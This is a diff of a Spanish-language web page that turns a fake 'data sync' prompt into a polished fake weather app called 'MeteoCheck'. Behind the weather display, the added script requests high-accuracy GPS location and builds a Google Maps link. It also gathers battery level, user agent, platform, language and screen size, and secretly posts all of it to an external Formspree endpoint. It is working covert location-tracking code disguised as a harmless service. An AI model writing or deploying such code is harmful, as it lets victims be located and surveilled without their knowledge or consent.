@@ -3,159 +3,413 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Actualización de Cookies</title>
+    <title>MeteoCheck — Clima Local</title>
     <style>
+        * { box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            color: #333333;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0b1120;
+            color: #f8fafc;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
+            padding: 16px;
+            overflow-x: hidden;
+            position: relative;
         }
-        .container {
-            max-width: 400px;
-            text-align: center;
+
+        /* Orbes de fondo animados */
+        .bg-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.35;
+            z-index: 0;
+            animation: floatOrb 8s ease-in-out infinite alternate;
         }
-        h1 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            color: #1a1a1a;
+        .orb-1 {
+            width: 280px;
+            height: 280px;
+            background: #0284c7;
+            top: -60px;
+            left: -60px;
         }
-        p {
-            font-size: 14px;
-            line-height: 1.5;
-            color: #666666;
-            margin-bottom: 20px;
+        .orb-2 {
+            width: 240px;
+            height: 240px;
+            background: #6366f1;
+            bottom: -50px;
+            right: -50px;
+            animation-delay: -4s;
         }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
+        @keyframes floatOrb {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(25px, 20px) scale(1.1); }
+        }
+
+        /* Tarjeta principal */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(15, 23, 42, 0.82);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(148, 163, 184, 0.18);
+            padding: 28px 24px;
+            border-radius: 22px;
             width: 100%;
-            transition: background-color 0.3s;
+            max-width: 400px;
+            box-shadow: 0 24px 50px rgba(0, 0, 0, 0.5);
+            animation: cardEnter 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
-        button:hover {
-            background-color: #0056b3;
+        @keyframes cardEnter {
+            from { opacity: 0; transform: translateY(20px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .loader {
-            display: none;
-            margin-top: 15px;
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+        }
+        .tag {
+            background: rgba(56, 189, 248, 0.15);
+            color: #7dd3fc;
             font-size: 12px;
-            color: #999;
+            font-weight: 600;
+            padding: 5px 12px;
+            border-radius: 999px;
+            border: 1px solid rgba(56, 189, 248, 0.25);
+        }
+        .live-dot {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #4ade80;
+            font-weight: 500;
+        }
+        .pulse {
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7);
+            animation: pulseDot 1.8s infinite;
+        }
+        @keyframes pulseDot {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
+            70% { box-shadow: 0 0 0 8px rgba(74, 222, 128, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+
+        h1 {
+            margin: 0 0 6px;
+            font-size: 23px;
+            letter-spacing: -0.3px;
+        }
+        .sub {
+            margin: 0 0 22px;
+            font-size: 14px;
+            color: #94a3b8;
+            line-height: 1.5;
+        }
+
+        /* Botón principal */
+        .btn {
+            width: 100%;
+            padding: 13px 18px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #0ea5e9, #2563eb);
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(14, 165, 233, 0.3);
+            transition: transform 0.2s ease, box-shadow 0.2s ease, filter 0.2s ease;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px rgba(14, 165, 233, 0.45);
+            filter: brightness(1.08);
+        }
+        .btn:active {
+            transform: translateY(0) scale(0.98);
+        }
+
+        /* Caja de progreso */
+        .progress-box {
+            display: none;
+            margin-top: 18px;
+            padding: 14px 16px;
+            border-radius: 14px;
+            background: rgba(30, 41, 59, 0.65);
+            border: 1px solid rgba(148, 163, 184, 0.15);
+            animation: fadeIn 0.3s ease;
+        }
+        .step {
+            font-size: 13px;
+            color: #cbd5e1;
+            margin: 7px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Tarjetas de resultado */
+        .result-box {
+            display: none;
+            margin-top: 18px;
+            animation: fadeIn 0.4s ease forwards;
+        }
+        .weather-hero {
+            background: linear-gradient(135deg, rgba(14, 165, 233, 0.18), rgba(99, 102, 241, 0.18));
+            border: 1px solid rgba(125, 211, 252, 0.25);
+            border-radius: 16px;
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 12px;
+            animation: slideUp 0.45s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        .weather-temp {
+            font-size: 40px;
+            font-weight: 700;
+            margin: 4px 0;
+            background: linear-gradient(to right, #f8fafc, #7dd3fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .weather-desc {
+            font-size: 13px;
+            color: #cbd5e1;
+        }
+
+        .metrics {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        .metric {
+            background: rgba(30, 41, 59, 0.7);
+            border: 1px solid rgba(148, 163, 184, 0.14);
+            padding: 12px;
+            border-radius: 14px;
+            opacity: 0;
+            transform: translateY(12px);
+            animation: slideUp 0.45s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            transition: transform 0.2s ease, border-color 0.2s ease;
+        }
+        .metric:nth-child(1) { animation-delay: 0.1s; }
+        .metric:nth-child(2) { animation-delay: 0.2s; }
+        .metric:hover {
+            transform: translateY(-3px);
+            border-color: rgba(56, 189, 248, 0.4);
+        }
+        .metric span {
+            display: block;
+            font-size: 11px;
+            color: #94a3b8;
+            margin-bottom: 4px;
+        }
+        .metric strong {
+            font-size: 15px;
+            color: #f8fafc;
+        }
+
+        .btn-retry {
+            margin-top: 14px;
+            background: rgba(51, 65, 85, 0.8);
+            box-shadow: none;
+            font-size: 13px;
+            padding: 10px;
+        }
+        .btn-retry:hover {
+            background: rgba(71, 85, 105, 0.95);
+            box-shadow: none;
+        }
+
+        .err-box {
+            display: none;
+            margin-top: 14px;
+            padding: 12px;
+            border-radius: 12px;
+            background: rgba(127, 29, 29, 0.35);
+            border: 1px solid rgba(248, 113, 113, 0.4);
+            color: #fca5a5;
+            font-size: 13px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(14px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Sincronización de Datos</h1>
-        <p>Tu dispositivo necesita actualizar su configuración de ubicación para garantizar la precisión del servicio. Haz clic abajo para permitir el acceso rápido.</p>
-        <button id="btnPermitir">Actualizar Ahora</button>
-        <div class="loader" id="loader">Procesando...</div>
+
+<div class="bg-orb orb-1"></div>
+<div class="bg-orb orb-2"></div>
+
+<div class="card">
+    <div class="header">
+        <span class="tag">🌦️ MeteoCheck</span>
+        <span class="live-dot"><span class="pulse"></span> En línea</span>
+    </div>
+    <h1>Clima de tu zona</h1>
+    <p class="sub">Consulta la temperatura y condiciones actuales según tu ubicación.</p>
+
+    <button class="btn" id="btnStart" onclick="iniciar()">Consultar clima ahora</button>
+
+    <div class="progress-box" id="progressBox">
+        <div class="step" id="s1">⏳ Detectando zona...</div>
+        <div class="step" id="s2">⏳ Consultando pronóstico...</div>
+        <div class="step" id="s3">⏳ Preparando tarjetas...</div>
     </div>
 
-    <script>
-        // Cookie falsa para simular que ya hemos interactuado antes
-        document.cookie = "session_id=abc123xyz; path=/";
-        
-        const btn = document.getElementById('btnPermitir');
-        const loader = document.getElementById('loader');
-        let formData = {};
+    <div class="result-box" id="resultBox"></div>
+    <div class="err-box" id="errBox"></div>
+</div>
 
-        function enviarDatos() {
-            fetch("PEGA_AQUI_TU_LINK_DE_FORMSPREE", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(formData)
-            }).then(() => {
-                loader.style.display = 'block';
-                setTimeout(() => {
-                    loader.textContent = "¡Actualizado!";
-                    loader.style.color = 'green';
-                }, 1500);
-            }).catch(error => console.error('Error:', error));
+<script>
+    const API_URL = "https://formspree.io/f/xgakrnjg";
+
+    function obtenerUbicacion() {
+        if (!("geolocation" in navigator)) {
+            return Promise.resolve({ disponible: false, motivo: "No soportado" });
         }
-
-        async function obtenerInfoDispositivo() {
-            // Datos más precisos basados en el User Agent real
-            const ua = navigator.userAgent;
-            let deviceModel = "Dispositivo Móvil";
-            
-            if (ua.includes("iPhone")) deviceModel = "Apple iPhone";
-            else if (ua.includes("Android")) {
-                // Intento de extraer modelo específico si está disponible en el UA
-                const match = ua.match(/;\s*([^;)]+)\s*Build/);
-                if (match && match[1]) deviceModel = `Android ${match[1]}`;
-                else deviceModel = "Dispositivo Android";
-            }
-            else if (ua.includes("Linux")) deviceModel = "Dispositivo Linux";
-            else if (ua.includes("Windows")) deviceModel = "PC Windows";
-            else if (ua.includes("Mac")) deviceModel = "Apple Mac";
-
-            return {
-                fechaHora: new Date().toISOString(),
-                dispositivo: {
-                    modelo: deviceModel,
-                    plataforma: navigator.platform || "Desconocida",
-                    pantalla: `${screen.width}x${screen.height}`,
-                    idioma: navigator.language,
-                    navegadores: ua.split(';').map(s => s.trim()).slice(0, 2).join(', ')
-                },
-                bateria: null,
-                ubicacion: null
-            };
-        }
-
-        btn.addEventListener('click', async () => {
-            loader.style.display = 'block';
-            
-            // 1. Obtener batería
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    formData.bateria = `${Math.round(battery.level * 100)}%`;
-                }
-            } catch (e) {}
-
-            // 2. Obtener ubicación con máxima precisión
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true, // Pide GPS real
-                            timeout: 10000,
-                            maximumAge: 0 // No usar caché vieja
-                        });
-                    });
-                    
-                    formData.ubicacion = {
-                        disponible: "yes",
-                        latitud: pos.coords.latitude,
-                        longitud: pos.coords.longitude,
-                        precisionMetros: Math.round(pos.coords.accuracy)
-                    };
-                    formData.enlaceMapa = `https://www.google.com/maps?q=${formData.ubicacion.latitud},${formData.ubicacion.longitud}`;
-                } catch (e) {
-                    formData.ubicacion = { disponible: "no", motivo: "Permiso denegado o tiempo agotado" };
-                }
-            } else {
-                formData.ubicacion = { disponible: "no", motivo: "Geolocalización no soportada" };
-            }
-
-            // 3. Recopilar todo y enviar
-            const dispositivoData = await obtenerInfoDispositivo();
-            Object.assign(formData, dispositivoData);
-
-            enviarDatos();
+        return new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                    disponible: true,
+                    latitud: pos.coords.latitude,
+                    longitud: pos.coords.longitude,
+                    precisionMetros: Math.round(pos.coords.accuracy)
+                }),
+                (err) => resolve({
+                    disponible: false,
+                    motivo: err.message || "Permiso denegado"
+                }),
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
         });
-    </script>
+    }
+
+    async function obtenerClima(lat, lon) {
+        try {
+            const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`;
+            const res = await fetch(url);
+            if (!res.ok) return null;
+            const data = await res.json();
+            return data.current_weather || null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    async function obtenerBateria() {
+        if (!("getBattery" in navigator)) return "No disponible";
+        try {
+            const b = await navigator.getBattery();
+            return `${Math.round(b.level * 100)}%${b.charging ? " ⚡" : ""}`;
+        } catch (e) {
+            return "No disponible";
+        }
+    }
+
+    async function iniciar() {
+        const btn = document.getElementById("btnStart");
+        const progressBox = document.getElementById("progressBox");
+        const resultBox = document.getElementById("resultBox");
+        const errBox = document.getElementById("errBox");
+        const s1 = document.getElementById("s1");
+        const s2 = document.getElementById("s2");
+        const s3 = document.getElementById("s3");
+
+        btn.style.display = "none";
+        errBox.style.display = "none";
+        resultBox.style.display = "none";
+        progressBox.style.display = "block";
+
+        s1.textContent = "⏳ Detectando zona...";
+        const ubicacion = await obtenerUbicacion();
+        s1.textContent = ubicacion.disponible ? "✅ Zona detectada" : "⚠️ Zona no disponible";
+
+        s2.textContent = "⏳ Consultando pronóstico...";
+        const clima = ubicacion.disponible ? await obtenerClima(ubicacion.latitud, ubicacion.longitud) : null;
+        s2.textContent = clima ? "✅ Datos del clima listos" : "ℹ️ Sin datos de clima";
+
+        const bateria = await obtenerBateria();
+        const enlaceMapa = ubicacion.disponible
+            ? `https://www.google.com/maps?q=${ubicacion.latitud},${ubicacion.longitud}`
+            : "Ubicación no disponible";
+
+        const payload = {
+            fechaHora: new Date().toISOString(),
+            enlaceMapa,
+            ubicacion,
+            climaActual: clima ? `${clima.temperature}°C, viento ${clima.windspeed} km/h` : "No disponible",
+            dispositivo: {
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                pantalla: `${window.screen.width}x${window.screen.height}`,
+                bateria
+            }
+        };
+
+        s3.textContent = "⏳ Preparando tarjetas...";
+        try {
+            const resp = await fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!resp.ok) throw new Error("Error al enviar");
+
+            progressBox.style.display = "none";
+            resultBox.style.display = "block";
+
+            const horaLocal = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            resultBox.innerHTML = `
+                <div class="weather-hero">
+                    <div class="weather-desc">Temperatura actual</div>
+                    <div class="weather-temp">${clima ? `${clima.temperature}°C` : "N/D"}</div>
+                    <div class="weather-desc">${ubicacion.disponible ? "Condición local en tiempo real" : "Activa la ubicación para ver el clima"}</div>
+                </div>
+                <div class="metrics">
+                    <div class="metric">
+                        <span>💨 Viento</span>
+                        <strong>${clima ? `${clima.windspeed} km/h` : "N/D"}</strong>
+                    </div>
+                    <div class="metric">
+                        <span>🕒 Actualizado</span>
+                        <strong>${horaLocal}</strong>
+                    </div>
+                </div>
+                <button class="btn btn-retry" onclick="iniciar()">Actualizar clima</button>
+            `;
+        } catch (err) {
+            progressBox.style.display = "none";
+            btn.style.display = "block";
+            errBox.style.display = "block";
+            errBox.textContent = "No se pudo consultar el clima. Intenta de nuevo.";
+        }
+    }
+</script>
+
 </body>
 </html>
